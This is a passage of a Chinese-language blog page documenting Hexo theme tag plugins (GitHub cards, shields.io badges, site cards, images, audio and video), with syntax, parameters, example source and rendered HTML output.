</div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-12-github卡片-ghcard">2.12 github卡片 ghcard</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% ghcard 用户名, 其它参数（可选） %&#125;</span><br><span class="line">&#123;% ghcard 用户名/仓库, 其它参数（可选） %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p>使用<code>,</code>分割各个参数。写法为：<code>参数名=参数值</code><br>以下只写几个常用参数值。</p><table><thead><tr><th><strong>参数名</strong></th><th>取值</th><th>释义</th></tr></thead><tbody><tr><td>hide</td><td>stars,commits,prs,issues,contribs</td><td>隐藏指定统计</td></tr><tr><td>count_private</td><td>true</td><td>将私人项目贡献添加到总提交计数中</td></tr><tr><td>show_icons</td><td>true</td><td>显示图标</td></tr><tr><td>theme</td><td>查阅:<a href="https://github.com/anuraghazra/github-readme-stats/blob/master/themes/README.md">Available Themes</a></td><td>主题</td></tr></tbody></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.用户信息卡片</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| &#123;% ghcard fomalhaut1998 %&#125; | &#123;% ghcard fomalhaut1998, theme=vue %&#125; |</span><br><span class="line">| -- | -- |</span><br><span class="line">| &#123;% ghcard fomalhaut1998, theme=buefy %&#125; | &#123;% ghcard fomalhaut1998, theme=solarized-light %&#125; |</span><br><span class="line">| &#123;% ghcard fomalhaut1998, theme=onedark %&#125; | &#123;% ghcard fomalhaut1998, theme=solarized-dark %&#125; |</span><br><span class="line">| &#123;% ghcard fomalhaut1998, theme=algolia %&#125; | &#123;% ghcard fomalhaut1998, theme=calm %&#125; |</span><br></pre></td></tr></table></figure><p>2.仓库信息卡片</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| &#123;% ghcard volantis-x/hexo-theme-volantis %&#125; | &#123;% ghcard volantis-x/hexo-theme-volantis, theme=vue %&#125; |</span><br><span class="line">| -- | -- |</span><br><span class="line">| &#123;% ghcard volantis-x/hexo-theme-volantis, theme=buefy %&#125; | &#123;% ghcard volantis-x/hexo-theme-volantis, theme=solarized-light %&#125; |</span><br><span class="line">| &#123;% ghcard volantis-x/hexo-theme-volantis, theme=onedark %&#125; | &#123;% ghcard volantis-x/hexo-theme-volantis, theme=solarized-dark %&#125; |</span><br><span class="line">| &#123;% ghcard volantis-x/hexo-theme-volantis, theme=algolia %&#125; | &#123;% ghcard volantis-x/hexo-theme-volantis, theme=calm %&#125; |</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.用户信息卡片</p><table><thead><tr><th><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&show_owner=true"/></a></th><th><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=vue&show_owner=true"/></a></th></tr></thead><tbody><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=buefy&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=solarized-light&show_owner=true"/></a></td></tr><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=onedark&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=solarized-dark&show_owner=true"/></a></td></tr><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=algolia&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=calm&show_owner=true"/></a></td></tr></tbody></table><p>2.仓库信息卡片</p><table><thead><tr><th><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&show_owner=true"/></a></th><th><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=vue&show_owner=true"/></a></th></tr></thead><tbody><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=buefy&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=solarized-light&show_owner=true"/></a></td></tr><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=onedark&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=solarized-dark&show_owner=true"/></a></td></tr><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=algolia&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=calm&show_owner=true"/></a></td></tr></tbody></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-13-github徽标-ghbdage">2.13 github徽标 ghbdage</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% bdage [right],[left],[logo]||[color],[link],[title]||[option] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>left</code>：徽标左边的信息，必选参数。</li><li><code>right</code>: 徽标右边的信息，必选参数，</li><li><code>logo</code>：徽标图标，图标名称详见<a href="https://simpleicons.org/">simpleicons</a>，可选参数。</li><li><code>color</code>：徽标右边的颜色，可选参数。</li><li><code>link</code>：指向的链接，可选参数。</li><li><code>title</code>：徽标的额外信息，可选参数。主要用于优化SEO，但<code>object</code>标签不会像<code>a</code>标签一样在鼠标悬停显示<code>title</code>信息。</li><li><code>option</code>：自定义参数，支持<a href="https://shields.io/">shields.io</a>的全部API参数支持，具体参数可以参看上文中的拓展写法示例。形式为<code>name1=value2&amp;name2=value2</code>。</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.基本参数,定义徽标左右文字和图标</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% bdage Theme,Butterfly %&#125;</span><br><span class="line">&#123;% bdage Frame,Hexo,hexo %&#125;</span><br></pre></td></tr></table></figure><p>2.信息参数，定义徽标右侧内容背景色，指向链接</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% bdage CDN,JsDelivr,jsDelivr||abcdef,https://metroui.org.ua/index.html,本站使用JsDelivr为静态资源提供CDN加速 %&#125;</span><br><span class="line">//如果是跨顺序省略可选参数，仍然需要写个逗号,用作分割</span><br><span class="line">&#123;% bdage Source,GitHub,GitHub||,https://github.com/ %&#125;</span><br></pre></td></tr></table></figure><p>3.拓展参数，支持shields的API的全部参数内容</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% bdage Hosted,Vercel,Vercel||brightgreen,https://vercel.com/,本站采用双线部署，默认线路托管于Vercel||style=social&amp;logoWidth=20 %&#125;</span><br><span class="line">//如果是跨顺序省略可选参数组，仍然需要写双竖线||用作分割</span><br><span class="line">&#123;% bdage Hosted,Vercel,Vercel||||style=social&amp;logoWidth=20&amp;logoColor=violet %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.基本参数,定义徽标左右文字和图标</p><p><object class="ghbdage" style="margin-inline:5px" title="" standby="loading..." data="https://img.shields.io/badge/Butterfly-Theme-orange?logo=&color=orange&link=&"></object><br><object class="ghbdage" style="margin-inline:5px" title="" standby="loading..." data="https://img.shields.io/badge/Hexo-Frame-orange?logo=hexo&color=orange&link=&"></object></p><p>2.信息参数，定义徽标右侧内容背景色，指向链接</p><p><object class="ghbdage" style="margin-inline:5px" title="本站使用JsDelivr为静态资源提供CDN加速" standby="loading..." data="https://img.shields.io/badge/JsDelivr-CDN-orange?logo=jsDelivr&color=abcdef&link=https://metroui.org.ua/index.html&"></object><br>//如果是跨顺序省略可选参数，仍然需要写个逗号,用作分割<br><object class="ghbdage" style="margin-inline:5px" title="" standby="loading..." data="https://img.shields.io/badge/GitHub-Source-orange?logo=GitHub&color=orange&link=https://github.com/&"></object></p><p>3.拓展参数，支持shields的API的全部参数内容</p><p><object class="ghbdage" style="margin-inline:5px" title="本站采用双线部署，默认线路托管于Vercel" standby="loading..." data="https://img.shields.io/badge/Vercel-Hosted-orange?logo=Vercel&color=brightgreen&link=https://vercel.com/&style=social&logoWidth=20"></object><br>//如果是跨顺序省略可选参数组，仍然需要写双竖线||用作分割<br><object class="ghbdage" style="margin-inline:5px" title="" standby="loading..." data="https://img.shields.io/badge/Vercel-Hosted-orange?logo=Vercel&color=orange&link=&style=social&logoWidth=20&logoColor=violet"></object></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-14-网站卡片-sites">2.14 网站卡片 sites</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-3">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% sitegroup %&#125;</span><br><span class="line">&#123;% site 标题, url=链接, screenshot=截图链接, avatar=头像链接（可选）, description=描述（可选） %&#125;</span><br><span class="line">&#123;% site 标题, url=链接, screenshot=截图链接, avatar=头像链接（可选）, description=描述（可选） %&#125;</span><br><span class="line">&#123;% endsitegroup %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% sitegroup %&#125;</span><br><span class="line">&#123;% site xaoxuu, url=https://xaoxuu.com, screenshot=https://i.loli.net/2020/08/21/VuSwWZ1xAeUHEBC.jpg, avatar=https://cdn.jsdelivr.net/gh/fomalhaut1998/cdn-assets/avatar/avatar.png, description=简约风格 %&#125;</span><br><span class="line">&#123;% site inkss, url=https://inkss.cn, screenshot=https://i.loli.net/2020/08/21/Vzbu3i8fXs6Nh5Y.jpg, avatar=https://cdn.jsdelivr.net/gh/inkss/common@master/static/web/avatar.jpg, description=这是一段关于这个网站的描述文字 %&#125;</span><br><span class="line">&#123;% site MHuiG, url=https://blog.mhuig.top, screenshot=https://i.loli.net/2020/08/22/d24zpPlhLYWX6D1.png, avatar=https://cdn.jsdelivr.net/gh/MHuiG/imgbed@master/data/p.png, description=这是一段关于这个网站的描述文字 %&#125;</span><br><span class="line">&#123;% site Colsrch, url=https://colsrch.top, screenshot=https://i.loli.net/2020/08/22/dFRWXm52OVu8qfK.png, avatar=https://cdn.jsdelivr.net/gh/Colsrch/images/Colsrch/avatar.jpg, description=这是一段关于这个网站的描述文字 %&#125;</span><br><span class="line">&#123;% site Linhk1606, url=https://linhk1606.github.io, screenshot=https://i.loli.net/2020/08/21/3PmGLCKicnfow1x.png, avatar=https://i.loli.net/2020/02/09/PN7I5RJfFtA93r2.png, description=这是一段关于这个网站的描述文字 %&#125;</span><br><span class="line">&#123;% endsitegroup %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><div class="site-card-group"><a class="site-card" href="https://fomalhaut1998.com"><div class="img"><img src="https://i.loli.net/2020/08/21/VuSwWZ1xAeUHEBC.jpg"/></div><div class="info"><img src="https://cdn.jsdelivr.net/gh/fomalhaut1998/cdn-assets/avatar/avatar.png"/><span class="title">fomalhaut1998</span><span class="desc">简约风格</span></div></a><a class="site-card" href="https://inkss.cn"><div class="img"><img src="https://i.loli.net/2020/08/21/Vzbu3i8fXs6Nh5Y.jpg"/></div><div class="info"><img src="https://cdn.jsdelivr.net/gh/inkss/common@master/static/web/avatar.jpg"/><span class="title">inkss</span><span class="desc">这是一段关于这个网站的描述文字</span></div></a><a class="site-card" href="https://blog.mhuig.top"><div class="img"><img src="https://i.loli.net/2020/08/22/d24zpPlhLYWX6D1.png"/></div><div class="info"><img src="https://cdn.jsdelivr.net/gh/MHuiG/imgbed@master/data/p.png"/><span class="title">MHuiG</span><span class="desc">这是一段关于这个网站的描述文字</span></div></a><a class="site-card" href="https://colsrch.top"><div class="img"><img src="https://i.loli.net/2020/08/22/dFRWXm52OVu8qfK.png"/></div><div class="info"><img src="https://cdn.jsdelivr.net/gh/Colsrch/images/Colsrch/avatar.jpg"/><span class="title">Colsrch</span><span class="desc">这是一段关于这个网站的描述文字</span></div></a><a class="site-card" href="https://linhk1606.github.io"><div class="img"><img src="https://i.loli.net/2020/08/21/3PmGLCKicnfow1x.png"/></div><div class="info"><img src="https://i.loli.net/2020/02/09/PN7I5RJfFtA93r2.png"/><span class="title">Linhk1606</span><span class="desc">这是一段关于这个网站的描述文字</span></div></a></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-15-行内图片-inlineimage">2.15 行内图片 inlineimage</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% inlineimage 图片链接, height=高度（可选） %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>高度</code>：height=20px</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这是 &#123;% inlineimage https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0000.gif %&#125; 一段话。</span><br><span class="line"></span><br><span class="line">这又是 &#123;% inlineimage https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/5150.gif, height=40px %&#125; 一段话。</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>这是 <img no-lazy class="inline" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0000.gif" style="height:1.5em"/> 一段话。</p><p>这又是 <img no-lazy class="inline" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/5150.gif" style="height:40px;"/> 一段话。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-16-单张图片-image">2.16 单张图片 image</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% image 链接, width=宽度（可选）, height=高度（可选）, alt=描述（可选）, bg=占位颜色（可选） %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li>图片宽度高度：width=300px, height=32px</li><li>图片描述：alt=图片描述（butterfly需要在主题配置文件中开启图片描述）</li><li>占位背景色：bg=#f2f2f2</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.添加描述：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% image https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg, alt=每天下课回宿舍的路，没有什么故事。 %&#125;</span><br></pre></td></tr></table></figure><p>2.指定宽度</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% image https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg, width=400px %&#125;</span><br></pre></td></tr></table></figure><p>3.指定宽度并添加描述：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% image https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg, width=400px, alt=每天下课回宿舍的路，没有什么故事。 %&#125;</span><br></pre></td></tr></table></figure><p>4.设置占位背景色：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% image https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg, width=400px, bg=#1D0C04, alt=优化不同宽度浏览的观感 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.添加描述：</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg" alt="每天下课回宿舍的路，没有什么故事。"/></div><span class="image-caption">每天下课回宿舍的路，没有什么故事。</span></div>2..指定宽度<div class="img-wrap"><div class="img-bg"><img class="img" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg" style="width:400px;"/></div></div>3.指定宽度并添加描述：<div class="img-wrap"><div class="img-bg"><img class="img" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg" alt="每天下课回宿舍的路，没有什么故事。" style="width:400px;"/></div><span class="image-caption">每天下课回宿舍的路，没有什么故事。</span></div>4.设置占位背景色：<div class="img-wrap"><div class="img-bg" style="background:#1D0C04"><img class="img" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg" alt="优化不同宽度浏览的观感" style="width:400px;"/></div><span class="image-caption">优化不同宽度浏览的观感</span></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-17-音频-audio">2.17 音频 audio</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-3">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% audio 音频链接 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% audio https://github.com/volantis-x/volantis-docs/releases/download/assets/Lumia1020.mp3 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><div class="audio"><audio controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/Lumia1020.mp3' type='audio/mp3'>Your browser does not support the audio tag.</audio></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-18-视频-video">2.18 视频 video</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% video 视频链接 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>对齐方向</code>：left, center, right</li><li><code>列数</code>：逗号后面直接写列数，支持 1 ～ 4 列。</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.100%宽度</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br></pre></td></tr></table></figure><p>2.50%宽度</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% videos, 2 %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% endvideos %&#125;</span><br></pre></td></tr></table></figure><p>3.25%宽度</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;% videos, 4 %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% endvideos %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.100%宽度</p><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div>2.50%宽度<div class="videos" col='2'><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div></div>3.25%宽度<div class="videos" col='4'><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' 